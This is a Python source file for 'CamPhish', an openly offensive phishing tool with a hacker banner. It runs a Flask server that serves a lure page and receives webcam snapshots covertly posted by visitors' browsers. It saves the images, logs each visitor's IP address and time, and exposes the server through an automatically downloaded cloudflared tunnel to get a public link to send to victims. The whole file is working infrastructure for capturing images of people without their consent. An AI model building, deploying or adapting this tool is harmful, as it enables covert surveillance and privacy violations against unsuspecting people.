#  ##   ##   ##   ##   ##   ##   ##   ##   ##   ##   ##   ##   ##   ##   ##   ##   ##  #
#                                                                                       #
#       ██╗  ██╗██╗   ██╗███████╗██╗  ██╗                                              #
#       ██║  ██║██║   ██║██╔════╝██║  ██║                                              #
#       ███████║██║   ██║███████╗███████║                                              #
#       ██╔══██║██║   ██║╚════██║██╔══██║                                              #
#       ██║  ██║╚██████╔╝███████║██║  ██║                                              #
#       ╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝                                              #
#                                                                                      #
#          ▄▀▀ ▄▀▄ █▄ ▄█ █▀█ █▄█ █ ▄▀▀ █▄█                                             #
#          ▀▄▄ █▀█ █ ▀ █ █▀▀ █ █ █ ▄█▀ █ █                                             #
#                                                                                      #
#   Author  : JANSON                                                                   #
#   Project : CamPhish                                                                 #
#   Platform: Kali Linux                                                               #
#                         # fsociety #                                                  #
#  ##   ##   ##   ##   ##   ##   ##   ##   ##   ##   ##   ##   ##   ##   ##   ##   ##  #

import sys
def _print_banner():
    c = "[1;36m"
    r = "[0m"
    print(c)
    print("  ##   ##   ##   ##   ##   ##   ##   ##   ##   ##   ##   ##   ##   ##   ##   ##   ##")
    print("  #                                                                                 #")
    print("  #       ██╗  ██╗██╗   ██╗███████╗██╗  ██╗                                        #")
    print("  #       ██║  ██║██║   ██║██╔════╝██║  ██║                                        #")
    print("  #       ███████║██║   ██║███████╗███████║                                        #")
    print("  #       ██╔══██║██║   ██║╚════██║██╔══██║                                        #")
    print("  #       ██║  ██║╚██████╔╝███████║██║  ██║                                        #")
    print("  #       ╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝                                        #")
    print("  #                                                                                #")
    print("  #          ▄▀▀ ▄▀▄ █▄ ▄█ █▀▄ █▄█ █ ▄▀▀ █▄█                                       #")
    print("  #          ▀▄▄ █▀▄ █ ▀ █ █▀▀ █ █ █ ▄█▀ █ █                                       #")
    print("  #                                                                                #")
    print("  #   Author  : JANSON                                                             #")
    print("  #   Project : CamPhish                                                           #")
    print("  #   Platform: Kali Linux                                                         #")
    print("  #                      # fsociety #                                               #")
    print("  ##   ##   ##   ##   ##   ##   ##   ##   ##   ##   ##   ##   ##   ##   ##   ##   ##")
    print(r)

_print_banner()


import os
import sys
import subprocess
import platform
import threading
import time
import base64
import re
import json
import datetime

def install(package):
    subprocess.check_call([sys.executable, "-m", "pip", "install", package,
                           "--break-system-packages", "--quiet"])

try:
    from flask import Flask, request, jsonify, make_response
    from flask_cors import CORS
except ImportError:
    print("[*] Installing Flask...")
    install("flask")
    install("flask-cors")
    from flask import Flask, request, jsonify, make_response
    from flask_cors import CORS

PORT       = 5000
IMG_FOLDER = "img"
IP_LOG     = "visitors.json"

os.makedirs(IMG_FOLDER, exist_ok=True)

app = Flask(__name__)
CORS(app, resources={r"/*": {"origins": "*"}})

@app.after_request
def add_cors_headers(response):
    response.headers["Access-Control-Allow-Origin"]  = "*"
    response.headers["Access-Control-Allow-Methods"] = "GET, POST, OPTIONS"
    response.headers["Access-Control-Allow-Headers"] = "Content-Type"
    return response

def get_visitor_ip():
    if request.headers.get("CF-Connecting-IP"):
        return request.headers.get("CF-Connecting-IP")
    if request.headers.get("X-Forwarded-For"):
        return request.headers.get("X-Forwarded-For").split(",")[0].strip()
    return request.remote_addr

def log_visitor(ip, filename):
    entry = {
        "ip"      : ip,
        "snapshot": filename,
        "time"    : datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }
    logs = []
    if os.path.exists(IP_LOG):
        try:
            with open(IP_LOG, "r") as f:
                logs = json.load(f)
        except:
            logs = []
    logs.append(entry)
    with open(IP_LOG, "w") as f:
        json.dump(logs, f, indent=2)
    return entry

def notify(ip, filename, size_kb, timestamp):
    print(f"\n[+] Snapshot received")
    print(f"    IP   : {ip}")
    print(f"    Time : {timestamp}")
    print(f"    File : {filename} ({size_kb} KB)\n")

@app.route("/", methods=["GET"])
def index():
    possible_paths = [
        os.path.join(os.path.dirname(os.path.abspath(__file__)), "index.html"),
        os.path.join(os.getcwd(), "index.html"),
        "index.html"
    ]
    for p in possible_paths:
        if os.path.exists(p):
            with open(p, "r", encoding="utf-8") as f:
                return f.read(), 200, {"Content-Type": "text/html; charset=utf-8"}
    return "<h2>index.html not found!</h2>", 404

@app.route("/snapshot", methods=["POST", "OPTIONS"])
def snapshot():
    if request.method == "OPTIONS":
        return make_response("", 204)

    visitor_ip = get_visitor_ip()
    data = request.get_json(silent=True)

    if not data or "image" not in data:
        return jsonify({"success": False, "error": "No image data"}), 400

    img_data = data["image"]
    if "," in img_data:
        img_data = img_data.split(",", 1)[1]

    try:
        img_bytes = base64.b64decode(img_data)
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 400

    timestamp = int(time.time() * 1000)
    filename  = f"{timestamp}.jpg"
    save_path = os.path.join(IMG_FOLDER, filename)

    with open(save_path, "wb") as f:
        f.write(img_bytes)

    entry = log_visitor(visitor_ip, filename)
    notify(visitor_ip, filename, len(img_bytes) // 1024, entry["time"])
    return jsonify({"success": True, "saved_as": filename}), 200

def get_cloudflared_path():
    system = platform.system().lower()
    arch   = platform.machine().lower()
    binary = "cloudflared.exe" if system == "windows" else "cloudflared"
    local  = os.path.join(os.path.dirname(os.path.abspath(__file__)), binary)

    if os.path.exists(local):
        return local

    print("[*] Downloading cloudflared...")
    base = "https://github.com/cloudflare/cloudflared/releases/latest/download/"
    if system == "windows":
        url = base + "cloudflared-windows-amd64.exe"
    elif system == "darwin":
        url = base + ("cloudflared-darwin-arm64" if "arm" in arch else "cloudflared-darwin-amd64")
    else:
        url = base + ("cloudflared-linux-arm64" if "arm" in arch else "cloudflared-linux-amd64")

    try:
        import urllib.request
        urllib.request.urlretrieve(url, local)
        if system != "windows":
            os.chmod(local, 0o755)
        print(f"[+] cloudflared ready")
    except Exception as e:
        print(f"[!] Failed: {e}")
        sys.exit(1)

    return local

def start_tunnel(port):
    cf   = get_cloudflared_path()
    cmd  = [cf, "tunnel", "--url", f"http://localhost:{port}", "--no-autoupdate"]
    proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    print("[*] Starting tunnel...")
    for line in proc.stdout:
        line = line.strip()
        if line:
            urls = re.findall(r'https://[^\s]+\.trycloudflare\.com', line)
            if urls:
                print(f"\n[+] Public URL: {urls[0]}\n")
            else:
                print(f"[cloudflared] {line}")

if __name__ == "__main__":
    script_dir = os.path.dirname(os.path.abspath(__file__))
    print(f"[*] Starting CamPhish...")
    print(f"[+] Images -> {os.path.abspath(IMG_FOLDER)}")
    print(f"[+] Port   -> {PORT}")

    threading.Thread(target=start_tunnel, args=(PORT,), daemon=True).start()
    time.sleep(1)
    app.run(host="0.0.0.0", port=PORT, debug=True, use_reloader=False)
